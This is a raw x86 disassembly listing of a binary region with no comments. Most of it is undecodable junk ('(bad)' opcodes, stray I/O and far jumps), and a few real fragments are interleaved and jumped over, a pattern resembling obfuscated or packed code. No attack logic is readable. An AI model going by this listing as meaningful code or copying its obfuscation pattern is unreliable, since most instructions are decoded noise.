  40698d:	jb     0x4069da
  40698f:	cmp    cl,BYTE PTR [esi+eiz*1-0x4660bf1f]
  406996:	inc    ecx
  406997:	test   DWORD PTR [ebx+0x71],ebp
  40699a:	adc    DWORD PTR [ebp+0x44],ebx
  40699d:	aas    
  40699e:	popf   
  40699f:	adc    edx,DWORD PTR fs:[ebp-0xf]
  4069a3:	xor    esp,DWORD PTR gs:[edx+0x9b2995c]
  4069aa:	cld    
  4069ab:	int    0x81
  4069ad:	cmp    ah,BYTE PTR [ebx]
  4069af:	sub    eax,0xd281494f
  4069b4:	pop    ecx
  4069b5:	(bad)  
  4069b6:	sbb    al,0xd7
  4069b8:	mov    ah,BYTE PTR [edx+0x17]
  4069bb:	fwait
  4069bc:	lods   eax,DWORD PTR ds:[esi]
  4069bd:	(bad)  
  4069be:	cdq    
  4069bf:	test   BYTE PTR ds:0xc0183759,bl
  4069c5:	mov    ah,0xb5
  4069c7:	(bad)  
  4069c8:	fiadd  DWORD PTR [esi+0x6b5ca035]
  4069ce:	shr    al,cl
  4069d0:	fs (bad) 
  4069d3:	add    ch,BYTE PTR [esi-0x10681a7f]
  4069d9:	mov    eax,ds:0xa9a019f4
  4069de:	jno    0x406a11
  4069e0:	jecxz  0x40696b
  4069e2:	xlat   BYTE PTR ds:[ebx]
  4069e3:	push   ds
  4069e4:	fisub  WORD PTR [ecx+0x513d46a7]
  4069ea:	dec    ecx
  4069eb:	push   esi
  4069ec:	xlat   BYTE PTR ds:[ebx]
  4069ed:	in     al,dx
  4069ee:	push   ss
  4069ef:	jo     0x40699d
  4069f1:	xchg   esi,eax
  4069f2:	add    DWORD PTR [edi-0x110bc564],esi
  4069f8:	test   BYTE PTR [ebp-0x7a],bl
  4069fb:	sub    edi,ebx
  4069fd:	dec    edi
  4069fe:	lahf   
  4069ff:	outs   dx,DWORD PTR ds:[esi]
  406a00:	inc    ebx
  406a01:	inc    esp
  406a02:	imul   edx,DWORD PTR [ebp+0x44],0x4c70266e
  406a09:	icebp  
  406a0a:	test   eax,0x8fbeb0c4
  406a0f:	mov    dh,0xb4
  406a11:	mov    esp,0xaa1a261
  406a16:	push   ss
  406a17:	das    
  406a18:	add    al,0x98
  406a1a:	(bad)  
  406a1b:	(bad)  
  406a1c:	adc    BYTE PTR [ecx],al
  406a1e:	or     ebp,edi
  406a20:	das    
  406a21:	repnz push eax
  406a23:	mov    fs:0x761cca9,al
  406a29:	sub    dl,BYTE PTR [ebx+0x40becfd9]
  406a2f:	cmc    
  406a30:	dec    esi
  406a31:	ins    DWORD PTR es:[edi],dx
  406a32:	ficomp WORD PTR [ebx+0x1d60c975]
  406a38:	scas   al,BYTE PTR es:[edi]
  406a39:	jae    0x4069dd
  406a3b:	rcl    DWORD PTR [ebx+0x24],0x61
  406a3f:	bound  esp,QWORD PTR [eax]
  406a41:	xchg   edi,eax
  406a42:	fmul   DWORD PTR [ebp-0xb]
  406a45:	outs   dx,DWORD PTR ds:[esi]
  406a46:	les    edx,FWORD PTR ds:0xd5f384b8
  406a4c:	loope  0x4069de
  406a4e:	add    al,0xd5
  406a50:	jmp    0xc73b:0x42762f0d
  406a57:	scas   eax,DWORD PTR es:[edi]
  406a58:	jmp    0xab38:0x59cca628
  406a5f:	ins    BYTE PTR es:[edi],dx
  406a60:	cmp    eax,0x34d7fc54
  406a65:	inc    esi
  406a67:	mov    edi,0x6e55b4a4
  406a6c:	push   ss
  406a6d:	out    0xd6,al
  406a6f:	imul   edi,ebx,0x3da1cb19
  406a75:	inc    eax
  406a76:	xor    al,0x8c
  406a78:	aaa    
  406a79:	call   0x257a412a
  406a7e:	js     0x406ae0
  406a80:	sti    
  406a81:	jp     0x406a2a
  406a83:	xor    ax,cx
  406a86:	mov    ecx,0x3b00
  406a8b:	add    ax,cx
  406a8e:	mov    ecx,DWORD PTR [ebp+0x8]
  406a91:	movzx  eax,ax
  406a94:	not    eax
  406a96:	and    eax,DWORD PTR [ecx]
  406a98:	mov    ecx,DWORD PTR [ebp+0x8]
  406a9b:	mov    DWORD PTR [ecx],eax
  406a9d:	jmp    0x406d02
  406aa2:	xor    DWORD PTR [ebp-0x4],0xe149ebe
  406aa9:	jmp    0x406d02
  406aae:	mov    edx,0x55acd5ce
  406ab3:	stos   DWORD PTR es:[edi],eax
  406ab4:	gs jmp 0xa8c2:0xd9dda5c
  406abc:	xor    BYTE PTR [ebx+0x7c7cc160],cl
  406ac2:	xor    BYTE PTR [esi+0x7c],bh
  406ac5:	jl     0x406abc
  406ac7:	into   
  406ac8:	mul    BYTE PTR [ebx+0x68]
  406acb:	xchg   al,cl
  406acd:	and    al,BYTE PTR [eax+0x6]
  406ad0:	adc    al,BYTE PTR [ecx-0x2c]
  406ad3:	fbld   TBYTE PTR [ecx]
  406ad5:	iret   
  406ad6:	adc    BYTE PTR [eax+eax*1],dh
  406ad9:	enter  0xc67a,0xc8
  406add:	sbb    cl,BYTE PTR [esi]
  406adf:	xor    al,0xe9
  406ae1:	mov    edx,0xa4a84c9
  406ae6:	xchg   ebp,eax
  406ae7:	or     DWORD PTR ds:0xc5302953,edx
  406aed:	in     eax,0x96
  406aef:	pop    edx
  406af0:	shl    DWORD PTR [eax],1
  406af2:	mov    esp,0x8fc11bed
  406af7:	sub    DWORD PTR [edx+0x6],0x25b2f004
  406afe:	xlat   BYTE PTR ds:[ebx]
  406aff:	jcxz   0x406b0a
  406b02:	mov    ebp,0x1a38b38
  406b07:	mov    ebp,0xadf7ee05
  406b0c:	mov    edx,0xb4853669
  406b11:	or     BYTE PTR [esi-0xc395719],dh
  406b17:	test   BYTE PTR cs:[ecx],al
  406b1a:	or     DWORD PTR [edi+eax*4-0x44f30ffe],edx
  406b21:	aas    
  406b22:	sbb    dl,BYTE PTR [edx+0x3768c49f]
  406b28:	pop    edx
  406b29:	inc    ebp
  406b2a:	sub    ch,BYTE PTR [edx]
  406b2c:	xchg   edx,eax
  406b2d:	dec    edi
  406b2e:	out    0x80,eax
  406b30:	out    dx,al
  406b31:	arpl   WORD PTR [edx-0x2f],si
  406b34:	lds    esp,FWORD PTR ds:0xfd0d38e
  406b3a:	cmp    eax,0xa4c3abc8
  406b3f:	in     eax,dx
  406b40:	ficom  WORD PTR [edx+0x754f58dc]
  406b46:	and    eax,0x65d6dc2a
  406b4b:	cmp    DWORD PTR [esi+0x5990b43b],0xab993426
  406b55:	sbb    al,0xb5
  406b57:	cwde   
  406b58:	sbb    BYTE PTR [esi*8+0x6552afd9],ah
  406b5f:	(bad)  
  406b60:	dec    ebp
  406b61:	ins    BYTE PTR es:[edi],dx
  406b62:	in     eax,dx
  406b63:	add    dl,BYTE PTR [edi]
  406b65:	out    0x72,eax
  406b67:	(bad)  
  406b68:	repz aad 0xc7
  406b6b:	dec    ebp
  406b6c:	dec    ecx
  406b6d:	je     0x406ba6
  406b6f:	out    0x25,eax
  406b71:	aam    0x3
  406b73:	xor    al,0x77
  406b75:	adc    DWORD PTR [edi-0x2e],edx
  406b78:	xor    eax,0x87324353
  406b7d:	imul   ebx,DWORD PTR [edi+0x73],0xffffff92
  406b81:	inc    edx
  406b82:	ret    0x7153
  406b85:	(bad)  
  406b87:	lahf   
  406b88:	and    DWORD PTR [ebp-0x6d],ebp
  406b8b:	or     cl,BYTE PTR [esi*4+0x8ac5768]
  406b92:	sub    bh,BYTE PTR ds:0x3ba06acd
  406b98:	adc    BYTE PTR [edx+0x1ce3f1cc],dl
  406b9e:	jnp    0x406b80
  406ba0:	pop    edi
  406ba1:	iret   
  406ba2:	pop    eax
  406ba3:	sbb    eax,0x219f2fff
  406ba8:	add    DWORD PTR [edi+edx*2+0x2e0be019],eax
  406baf:	adc    al,0xaa
  406bb1:	dec    ebx
  406bb2:	call   0x116f543f
  406bb7:	sbb    eax,DWORD PTR [edx+0x77]
  406bba:	fucom  st(5)
  406bbc:	inc    edi
  406bbd:	rcr    cl,1
  406bbf:	imul   al
  406bc1:	xlat   BYTE PTR ds:[ebx]
  406bc2:	lods   eax,DWORD PTR ds:[esi]
  406bc3:	sub    eax,0xbc97bc63
  406bc8:	jecxz  0x406bbd
  406bca:	int    0xc6
  406bcc:	and    bl,BYTE PTR [eax]
  406bce:	das    
  406bcf:	pop    eax
  406bd0:	stos   BYTE PTR es:[edi],al
  406bd1:	pop    eax
  406bd2:	add    BYTE PTR [bp+si],dl
  406bd5:	cdq    
  406bd6:	sbb    al,0xdc
  406bd8:	sbb    eax,DWORD PTR [esi+0x6fbfb9d0]
  406bde:	mov    ah,BYTE PTR [edx]
  406be0:	sub    eax,0xbab61696
  406be5:	fiadd  WORD PTR [edi]
  406be7:	rcl    DWORD PTR [ecx+0x7cf6652],1
  406bed:	mov    ebp,0x8f515c77
  406bf2:	cmp    eax,0x82e7f556
  406bf7:	mov    ecx,0x6dddeeb
  406bfc:	sbb    esp,0xffffffa1
  406bff:	or     al,0xd6
  406c01:	or     eax,0x3679a7fe
  406c06:	mov    edx,0x4166781
  406c0b:	lods   eax,DWORD PTR ds:[esi]
  406c0c:	pop    eax
  406c0d:	paddusb mm4,QWORD PTR [ebp-0x302f1701]
  406c14:	(bad)  
  406c16:	mov    esi,0x721ac85f
  406c1b:	sub    cl,cl
  406c1d:	popf   
  406c1e:	xor    dl,cl
  406c20:	aaa    
  406c21:	mov    DWORD PTR [ecx+0x55],esp
  406c24:	aad    0x4a
  406c26:	cdq    
  406c27:	fs out 0x11,eax
  406c2a:	mov    ebp,0x5d023fe0
  406c2f:	call   0xe320:0x4e7bcdf7
  406c36:	lock aam 0xfa
  406c39:	push   esp
  406c3a:	inc    edx
  406c3b:	mov    ebx,0x23731f7e
  406c41:	hlt    
  406c42:	xor    cl,BYTE PTR [eax]
  406c44:	xor    BYTE PTR [esi+0x9],dl
  406c47:	fstp   TBYTE PTR [ecx]
  406c49:	jb     0x406c39
  406c4b:	pop    ds
  406c4c:	nop
  406c4d:	sar    DWORD PTR [edx+ecx*8],0x62
  406c51:	xor    al,0x63
  406c53:	mov    esi,0xb2c31035
  406c58:	jecxz  0x406c30
  406c5a:	sub    eax,0xa282f364
  406c5f:	sahf   
  406c60:	(bad)  
  406c61:	stos   BYTE PTR es:[edi],al
  406c62:	(bad)  
  406c63:	sub    eax,0xbade8e7e
  406c68:	xor    eax,0xadc98273
  406c6d:	adc    cl,ch
  406c6f:	or     BYTE PTR gs:[ebx-0x21],bh
  406c73:	xchg   dl,ch
  406c75:	sub    ebx,DWORD PTR [edx-0x528e55cf]
  406c7b:	repz mov bh,BYTE PTR [esi+0x55]
  406c7f:	sbb    al,0x17
  406c81:	(bad)  
  406c82:	cmc    
  406c83:	leave  
  406c84:	ja     0x406ca8
  406c86:	in     al,0x5d
  406c88:	int    0x1
  406c8a:	js     0x406cb7
  406c8c:	sahf   
  406c8d:	pop    ecx
  406c8e:	dec    eax
  406c8f:	rcl    BYTE PTR [ebx-0x2c70d528],1
  406c95:	int    0x3c
  406c97:	xchg   ecx,eax
  406c98:	js     0x406c98
  406c9a:	iret   
  406c9b:	push   0x4e
  406c9d:	iret   
  406c9e:	mov    dl,0xbd
  406ca0:	sbb    al,0x14
  406ca2:	js     0x406c34
  406ca4:	and    eax,0x6285447f
  406ca9:	xor    eax,0x950d7c9e
  406cae:	sbb    ah,dh
  406cb0:	sbb    bh,cl
  406cb2:	bnd js 0x406c9a
  406cb5:	std    
  406cb6:	fbstp  TBYTE PTR [eax+0x1589c826]
  406cbc:	push   ecx
  406cbd:	std    
  406cbe:	stos   BYTE PTR es:[edi],al
  406cbf:	xchg   BYTE PTR fs:[bx+si],bh
  406cc3:	daa    
  406cc4:	jge    0x406caf
  406cc6:	js     0x406d13
  406cc8:	adc    eax,0x388ec1db
  406ccd:	dec    edi
  406cce:	mov    ecx,0xddfb5ec0
  406cd3:	xlat   BYTE PTR ds:[ebx]
  406cd4:	shl    DWORD PTR [ebp-0x53],1
  406cd7:	pop    edx
  406cd8:	fucomip st,st(0)
  406cda:	scas   al,BYTE PTR es:[edi]
  406cdb:	gs xchg ecx,eax
  406cdd:	ss into 
  406cdf:	jns    0x406cf5
  406ce1:	xor    BYTE PTR [esi+edx*1],ah
  406ce4:	daa    
  406ce5:	setp   BYTE PTR [esi-0x65]
  406ce9:	sahf   
  406cea:	stos   BYTE PTR es:[edi],al
  406ceb:	test   eax,0xfaeed69c
  406cf0:	imul   edi,DWORD PTR [ebx-0x182bc100],0x9b45e4c0
  406cfa:	xchg   esi,eax
  406cfb:	aad    0x4e
  406cfd:	push   ss
  406cfe:	out    0x62,al
  406d00:	popa   
  406d01:	fisub  WORD PTR [esi-0x75]
  406d04:	inc    ebp
  406d05:	clc    
  406d06:	push   DWORD PTR [ebp+0x8]
  406d09:	call   0x406d1a
  406d0e:	test   eax,eax
  406d10:	je     0x406aa2
  406d16:	leave  
  406d17:	ret    0x4
  406d1a:	push   ebp
  406d1b:	mov    ebp,esp
  406d1d:	sub    esp,0x2c
  406d20:	mov    ecx,DWORD PTR ds:0x4336ff
  406d26:	mov    ecx,DWORD PTR [ecx]
  406d28:	or     DWORD PTR ds:0x43371b,ecx
  406d2e:	mov    DWORD PTR [ebp-0x8],0xf89c8534
  406d35:	mov    DWORD PTR [ebp-0x14],0xf89c8535
  406d3c:	xor    DWORD PTR ds:0x43369b,0x9dc
  406d46:	mov    eax,0x9577
  406d4b:	movzx  ecx,BYTE PTR ds:0x433643
  406d52:	or     DWORD PTR ds:0x43369f,ecx
  406d58:	mov    WORD PTR [ebp-0x4],ax
  406d5c:	and    DWORD PTR ds:0x433657,0xaa
  406d66:	lea    eax,[ebp-0x24]
  406d69:	adc    DWORD PTR ds:0x43371b,ebx
  406d6f:	jmp    0x4070e5
  406d74:	mov    esp,ecx
  406d76:	in     eax,dx
  406d77:	xchg   ebx,eax
  406d78:	ins    DWORD PTR es:[edi],dx
  406d79:	mov    ebp,0xc300d269
  406d7e:	ss mov bh,cl
  406d81:	fist   WORD PTR [edx+0x7cc2240a]
  406d87:	jl     0x406d60
  406d89:	jns    0x406e07
  406d8b:	jl     0x406d9c
  406d8d:	add    bh,bh
  406d8f:	sbb    al,0x5f
  406d91:	out    dx,al
  406d92:	mov    esi,ss
  406d94:	cmp    eax,0x963c816b
  406d99:	cmc    
  406d9a:	jno    0x406d3f
  406d9c:	gs out 0x9c,al
  406d9f:	mov    ah,0x28
  406da1:	in     al,dx
  406da2:	fsqrt  
  406da4:	adc    al,0x21
  406da6:	xchg   BYTE PTR [edx+edx*8+0x1ab5c1a3],bh
  406dad:	jp     0x406dba
  406daf:	push   edi
  406db0:	jne    0x406df9
  406db2:	int    0x83
  406db4:	jo     0x406d92
  406db6:	pushf  
  406db7:	mov    eax,ds:0xfeea5e76
  406dbc:	outs   dx,DWORD PTR ds:[esi]
  406dbd:	ror    BYTE PTR [edi-0x5c],0xc4
  406dc1:	xor    BYTE PTR [edx+eax*8],dl
  406dc4:	push   edi
  406dc5:	(bad)  
  406dc7:	outs   dx,BYTE PTR ds:[esi]
  406dc8:	or     eax,0x5c896772
  406dcd:	push   edx
  406dce:	imul   esp,DWORD PTR [ebx-0x727ddf8d],0xffffffcc
  406dd5:	ins    DWORD PTR es:[edi],dx
  406dd6:	stos   BYTE PTR es:[edi],al
  406dd7:	das    
  406dd8:	(bad)  
  406dd9:	bnd jb 0x406df8
  406ddc:	add    eax,0xb7b85636
  406de1:	(bad)  [eax-0x58]
  406de4:	dec    esp
  406de5:	sub    esi,DWORD PTR [esi+ebx*8]
  406de8:	ficom  DWORD PTR [edi+eax*8+0x79]
  406dec:	lods   al,BYTE PTR ds:[esi]
  406ded:	jp     0x406da6
  406def:	ja     0x406db9
  406df1:	or     BYTE PTR [esi-0x69],ch
  406df4:	leave  
  406df5:	mov    bh,0x4d
  406df7:	popf   
  406df8:	(bad)  
  406df9:	dec    edi
  406dfa:	and    dh,BYTE PTR [edi+0x59]
  406dfd:	xchg   ebp,eax
  406dfe:	or     ecx,DWORD PTR [ebp-0x19]
  406e01:	mov    bl,0xdd
  406e03:	xor    al,0xec
  406e05:	add    DWORD PTR [esi-0x20],ecx
  406e08:	in     eax,dx
  406e09:	out    dx,eax
  406e0a:	call   0x293a:0x7334f672
  406e11:	mov    ebp,0x926e24b9
  406e16:	xor    ebp,DWORD PTR [edx+0x1d]
  406e19:	cmp    BYTE PTR [ebx],cl
  406e1b:	and    cl,BYTE PTR [ebx-0x5d794fed]
  406e21:	(bad)  
  406e22:	jmp    0x29e9d513
  406e27:	popa   
  406e28:	sub    al,0xbd
  406e2a:	push   0x79
  406e2c:	lods   eax,DWORD PTR ds:[esi]
  406e2d:	mov    bl,cl
  406e2f:	jecxz  0x406dd8
  406e31:	dec    esi
  406e32:	bound  ebx,QWORD PTR [edi]
  406e34:	dec    esi
  406e35:	mov    ah,0x95
  406e37:	add    BYTE PTR [edi-0x72c3daef],dh
  406e3d:	lock and ecx,DWORD PTR [ebp+edi*8-0x2d32c910]
  406e45:	stos   DWORD PTR es:[edi],eax
  406e46:	clc    
  406e47:	setns  ch
  406e4a:	or     BYTE PTR [ebx],al
  406e4c:	pop    ds
  406e4d:	push   esp
  406e4e:	jns    0x406de4
  406e50:	mov    ebx,edi
  406e52:	in     eax,dx
  406e53:	xchg   DWORD PTR [esi],ebx
  406e55:	sub    BYTE PTR [ebp-0x19be9c5f],ah
  406e5b:	sbb    DWORD PTR [eax+0xe],edi
  406e5e:	push   cs
  406e5f:	adc    DWORD PTR [ebp-0x4d28a602],0x74
  406e66:	mov    bl,0xe6
  406e68:	mov    dh,BYTE PTR [edi]
  406e6a:	fcom   DWORD PTR fs:[edx+esi*1-0x3c]
  406e6f:	sahf   
  406e70:	dec    eax
  406e71:	rcl    DWORD PTR [ecx-0x2df121a3],cl
  406e77:	push   0xe692b41f
  406e7c:	fild   WORD PTR [ecx-0xc]
  406e7f:	add    ebx,DWORD PTR [esi]
  406e81:	dec    edx
  406e82:	(bad)  
  406e83:	test   eax,0x995c2e3a
  406e88:	add    bl,bh
  406e8a:	pop    eax
  406e8b:	cld    
  406e8c:	push   ebx
  406e8d:	nop
  406e8e:	daa    
  406e8f:	mov    ebx,0x6ced35b1
  406e94:	cmp    edi,DWORD PTR [edi]
  406e96:	stos   BYTE PTR es:[edi],al
  406e97:	out    0x86,eax
  406e99:	adc    BYTE PTR [ecx-0x5],bl
  406e9c:	stos   DWORD PTR es:[edi],eax
  406e9d:	xchg   ebx,eax
  406e9e:	xor    DWORD PTR [ebp+0x2469fe0e],0x21
  406ea5:	sbb    DWORD PTR [ecx-0x34],edx
  406ea8:	(bad)  
  406ea9:	or     BYTE PTR [esi-0xde75af6],al
  406eaf:	lock dec esp
  406eb1:	shr    BYTE PTR [edi-0x4654ee4f],1
  406eb7:	mov    WORD PTR [ecx+0x279b5dfa],cs
  406ebd:	mov    ebx,0xbdb34145
  406ec2:	and    BYTE PTR [ebp+0x2f],ch
  406ec5:	pop    edx
  406ec6:	je     0x406e65
  406ec8:	inc    esp
  406ec9:	loope  0x406e99
  406ecb:	hlt    
  406ecc:	shl    BYTE PTR [eax-0x2ce6e763],cl
  406ed2:	ret    0x681e
  406ed5:	dec    ebp
  406ed6:	mov    dh,BYTE PTR [ecx]
  406ed8:	add    eax,0x9bec7933
  406edd:	out    0x84,al
  406edf:	adc    cl,ah
  406ee1:	pop    ecx
  406ee2:	pop    ebp
  406ee3:	test   BYTE PTR [edx-0x43156507],dl
  406ee9:	repnz sbb ch,al
  406eec:	call   0x3700:0xe781f7b0
  406ef3:	xlat   BYTE PTR ds:[ebx]
  406ef4:	scas   eax,DWORD PTR es:[edi]
  406ef5:	xor    BYTE PTR [ecx+0x79393e56],ah
  406efb:	ret    
  406efc:	mov    dh,BYTE PTR [ecx-0x3ee40f92]
  406f02:	fs cld 
  406f04:	fwait
  406f05:	dec    ebp
  406f06:	cmp    edi,edi
  406f08:	jl     0x406f3e
  406f0a:	jp     0x406f48
  406f0c:	push   0x71
  406f0e:	rcr    BYTE PTR [edx+0x49],0x55
  406f12:	popa   
  406f13:	stos   DWORD PTR es:[edi],eax
  406f14:	and    DWORD PTR [ebp-0x53],ebp
  406f17:	sbb    eax,0xba6270ef
  406f1c:	out    0x2c,eax
  406f1e:	jne    0x406f34
  406f20:	fcomp  QWORD PTR [eax+0x2a2862e2]
  406f26:	mov    esp,0x331771fe
  406f2b:	adc    ch,BYTE PTR [ebp-0x2c]
  406f2e:	rcr    DWORD PTR [eax-0x6c9c17ef],0xb2
  406f35:	pop    eax
  406f36:	mov    ebp,0xca791aa2
  406f3b:	shl    BYTE PTR [eax],cl
  406f3d:	mov    ds:0xa0ca17ee,al
  406f42:	push   0xd653eb38
  406f47:	hlt    
  406f48:	fldenv [edi+0x71]
  406f4b:	push   edi
  406f4c:	inc    edi
  406f4d:	idiv   bl
  406f4f:	into   
  406f50:	test   eax,0xb80ffd7f
  406f55:	push   ebx
  406f56:	ret    0x3668
  406f59:	movzx  esi,BYTE PTR [edi]
  406f5c:	jmp    0x97966aba
  406f61:	xchg   ebp,eax
  406f62:	fwait
  406f63:	jne    0x406f19
  406f65:	sub    BYTE PTR [edx-0x3e66d86f],ch
  406f6b:	scas   eax,DWORD PTR es:[edi]
  406f6c:	inc    eax
  406f6d:	push   eax
  406f6e:	inc    esi
  406f6f:	pop    ds
  406f70:	inc    esi
  406f71:	clc    
  406f72:	mov    ecx,0x1ed55e3
  406f77:	sub    DWORD PTR [edx-0x74],eax
  406f7a:	test   DWORD PTR [edx+0x2],eax
  406f7d:	retf   
  406f7e:	sbb    eax,0x33bc1e5a
  406f83:	repnz mov edi,es
  406f86:	pushf  
  406f87:	test   eax,0x29a0aadb
  406f8c:	(bad)  
  406f8d:	jne    0x406f28
  406f8f:	sar    esp,cl
  406f91:	out    0xe0,al
  406f93:	icebp  
  406f94:	jmp    0x6a58a51e
  406f99:	push   cs
  406f9a:	xchg   edi,eax
  406f9b:	ja     0x406fef
  406f9d:	pop    es
  406f9e:	sbb    al,0x21
  406fa0:	jp     0x406f25
  406fa2:	test   al,0xc3
  406fa4:	jo     0x406fdf
  406fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fa7:	lock add eax,0x3230f8e5
  406fad:	js     0x406f5d
  406faf:	push   0x24
  406fb1:	mov    ebx,DWORD PTR [edi-0xe]
  406fb4:	(bad)  
  406fb5:	adc    dh,BYTE PTR [ecx+0x1f249c3b]
  406fbb:	jmp    0x4c1a:0x3459f4
  406fc2:	xchg   edx,eax
  406fc3:	push   eax
  406fc4:	cld    
  406fc5:	push   esi
  406fc6:	aas    
  406fc7:	sub    DWORD PTR [esi],0x16
  406fca:	mov    WORD PTR [ebp+0x3c],fs
  406fcd:	xor    BYTE PTR [ebp-0x4c],bl
  406fd0:	icebp  
  406fd1:	test   DWORD PTR [edi-0x68],0x4d331423
  406fd8:	xor    edx,DWORD PTR [edx-0x62]
  406fdb:	daa    
  406fdc:	adc    BYTE PTR [ebx-0x17],ch
  406fdf:	pop    ss
  406fe0:	fdiv   st(1),st
  406fe2:	push   ecx
  406fe3:	sbb    al,0x38
  406fe5:	add    DWORD PTR [esp+ecx*2+0xb],ecx
  406fe9:	sbb    dh,dl
  406feb:	mov    ecx,eax
  406fed:	lea    ebp,[edx]
  406fef:	xor    eax,0xc2052464
  406ff4:	nop
  406ff5:	sti    
  406ff6:	jo     0x40704c
  406ff8:	xchg   DWORD PTR [eax-0x28c1e772],ecx
  406ffe:	pop    eax
  406fff:	in     al,0xa9
  407001:	pop    edi
  407002:	mov    al,0x25
  407004:	iret   
  407005:	lods   eax,DWORD PTR ds:[esi]
  407006:	(bad)  
  407007:	fadd   st,st(6)
  407009:	mov    ecx,0xb50ff594
  40700e:	dec    ebp
  40700f:	imul   esi,DWORD PTR [ecx+esi*8-0x4729fd0b],0xcb8bff08
  40701a:	xchg   edx,eax
  40701b:	mov    esi,0xaf150ac9
  407020:	aam    0xf3
  407022:	fimul  WORD PTR [edi-0x18]
  407025:	inc    BYTE PTR [ebx]
  407027:	outs   dx,DWORD PTR ds:[esi]
  407028:	mov    ch,0xc3
  40702a:	pop    ecx
  40702b:	mov    eax,0xb60e742e
  407030:	arpl   WORD PTR [edx+0x18cdcdf2],sp
  407036:	leave  
  407037:	mov    ds:0x640e0a5b,eax
  40703c:	pop    ebp
  40703d:	stc    
  40703e:	mov    al,0xc
  407040:	fnstsw WORD PTR [ebx]
  407042:	ret    
  407043:	sbb    DWORD PTR [edx-0x74],ecx
  407046:	xchg   edi,eax
  407047:	cmp    DWORD PTR [esi+0x7dd57b6c],ecx
  40704d:	int3   
  40704e:	xchg   edx,eax
  40704f:	xchg   esp,eax
  407050:	cld    
  407051:	lods   eax,DWORD PTR ds:[esi]
  407052:	ins    DWORD PTR es:[edi],dx
  407053:	or     BYTE PTR [ebx-0x1bb909fd],0x96
  40705a:	adc    eax,0xde858774
  40705f:	pop    edi
  407060:	and    eax,0x80fd196b
  407065:	cmp    dl,ah
  407067:	leave  
  407068:	cli    
  407069:	jmp    0x407090
  40706b:	mov    ebx,0x80caba9b
  407070:	rol    ah,1
  407072:	xor    eax,0x37d8aff5
  407077:	pop    ds
  407078:	addr16 jno 0x4070c2
  40707b:	mov    dh,0xa5
  40707d:	mov    esi,0xc7989148
  407082:	aad    0xae
  407084:	repz in eax,dx
  407086:	jb     0x40700d
  407088:	aam    0x1f
  40708a:	iret   
  40708b:	cwde   
  40708c:	popa   
  40708d:	out    0x14,eax
  40708f:	or     al,ah
  407091:	and    ch,BYTE PTR [esi+0x435af41b]
  407097:	int3   
  407098:	mov    eax,0xf92d2adf
  40709d:	sbb    eax,0x49729ac4
  4070a2:	dec    esi
  4070a3:	xchg   edx,eax
  4070a4:	mov    ?,WORD PTR [edi]
  4070a6:	int3   
  4070a7:	out    0xa5,eax
  4070a9:	or     ecx,DWORD PTR [ecx+0x2ae4b3d8]
  4070af:	jb     0x40706c
  4070b1:	adc    ch,BYTE PTR [edi]
  4070b3:	aas    
  4070b4:	in     eax,0x17
  4070b6:	cmp    DWORD PTR [ecx+0x7a],edx
  4070b9:	int    0x99
  4070bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070bc:	mov    cs:0xf3c9a5f3,eax
  4070c2:	pop    esi
  4070c3:	cli    
  4070c4:	sbb    dh,dh
  4070c6:	inc    ebp
  4070c7:	popf   
  4070c8:	outs   dx,BYTE PTR ds:[esi]
  4070c9:	mov    ah,0xbd
  4070cb:	(bad)
  4070ce:	cdq    
  4070cf:	test   DWORD PTR [ebp+0x68dc4ef3],esp
  4070d5:	test   eax,0x26b2c3db
  4070da:	adc    DWORD PTR [esi],esp
  4070dc:	pusha  
  4070dd:	inc    edi
  4070de:	neg    BYTE PTR [edi+0x29b4b2cc]
  4070e4:	fisttp DWORD PTR [ecx+0x2581d845]
  4070ea:	dec    edi
  4070eb:	ss inc ebx
  4070ed:	add    BYTE PTR [ebp+0x27],cl
  4070f0:	add    BYTE PTR [eax],al
  4070f2:	mov    eax,DWORD PTR [ebp+0x8]
  4070f5:	mov    DWORD PTR [ebp-0x20],eax
  4070f8:	xor    ecx,ecx
  4070fa:	xor    ecx,DWORD PTR ds:0x4336f3
  407100:	add    ecx,DWORD PTR ds:0x433643
  407106:	mov    DWORD PTR ds:0x4336f3,ecx
  40710c:	jmp    0x407482
  407111:	ret    
  407112:	and    dl,dl
  407114:	paddw  mm5,mm1
  407117:	int    0xf0
  407119:	xchg   DWORD PTR [esi+0xb],edx
  40711c:	(bad)  
  40711d:	ds jmp 0xd0400552
  407123:	jl     0x4071a1
  407125:	xlat   BYTE PTR ds:[ebx]
  407126:	jns    0x4071a4
  407128:	jl     0x4070e8
  40712a:	iret   
  40712b:	es stos DWORD PTR es:[edi],eax
  40712d:	xchg   BYTE PTR [ecx],al
  40712f:	mov    ebx,0xb79b530f
  407134:	into   
  407135:	and    DWORD PTR [ebp+0x46baee8],esp
  40713b:	or     ch,bl
  40713d:	mov    ecx,0x66a4db7f
  407142:	sub    dl,BYTE PTR [edi-0xea88b5b]
  407148:	outs   dx,BYTE PTR ds:[esi]
  407149:	lahf   
  40714a:	cmp    eax,0xedaa7660
  40714f:	mov    edi,0x44983b22
  407154:	xlat   BYTE PTR ds:[ebx]
  407155:	sti    
  407156:	jbe    0x4070de
  407158:	ror    BYTE PTR [esi],1
  40715a:	sbb    BYTE PTR [ebp+0x1ff5637c],bh
  407160:	gs rcl esp,1
  407163:	xor    DWORD PTR [eax-0x10c4c299],edi
  407169:	popa   
  40716a:	cld    
  40716b:	xor    bl,BYTE PTR [ebx+eax*1-0x6abb9b34]
  407172:	sub    dh,BYTE PTR [eax-0x37d3605a]
  407178:	jo     0x4071a1
  40717a:	mov    DWORD PTR [edx+0x17f31709],esp
  407180:	mov    edi,0xf463fd14
  407185:	jno    0x407163
  407187:	div    BYTE PTR [ebx-0x6]
  40718a:	xchg   edi,eax
  40718b:	adc    ch,ah
  40718d:	inc    edi
  40718e:	loop   0x40720c
  407190:	lock sar BYTE PTR [ecx+0x568db3a3],0x22
  407198:	jmp    0x4071a4
  40719a:	mov    cl,0x9
  40719c:	mov    BYTE PTR [edx],ch
  40719e:	mov    ch,0x70
  4071a0:	or     ecx,DWORD PTR [edx]
  4071a2:	fs (bad) 
  4071a4:	jo     0x4071fd
  4071a6:	push   ebx
  4071a7:	pop    edi
  4071a8:	jo     0x4071d3
  4071aa:	mov    bl,0xcf
  4071ac:	adc    eax,DWORD PTR [eax+0x525f42b2]
  4071b2:	pushf  
  4071b3:	shl    ecx,0x9a
  4071b6:	shr    BYTE PTR [edx-0x60964f5e],cl
  4071bc:	mov    cs,WORD PTR [ebp-0xf]
  4071bf:	jl     0x407237
  4071c1:	jns    0x4071e4
  4071c3:	nop
